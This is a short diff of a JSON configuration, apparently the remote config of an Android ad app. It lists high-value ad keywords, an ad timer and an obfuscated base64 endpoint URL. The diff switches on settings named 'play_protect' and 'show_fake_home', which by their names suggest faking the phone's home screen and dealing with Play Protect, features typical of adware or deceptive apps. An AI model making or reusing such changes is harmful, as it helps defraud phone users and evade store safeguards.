@@ -20,11 +20,11 @@
       "high_paying_keyword_4": "attorney",
       "high_paying_keyword_5": "mortgage",
       "timer_ads": "60000",
-      "play_protect": "0",
+      "play_protect": "1",
       "base_license_key": "",
       "status_app": "0",
       "link_redirect": "https://play.google.com/store/apps/details?id=com.google.android.apps.searchlite",
-      "show_fake_home": "0",
+      "show_fake_home": "1",
       "login_status": "false",
 	  "config": "aHR0cHM6Ly9kYXNoZHJha29yLm15LmlkL2FwaS8="
     }
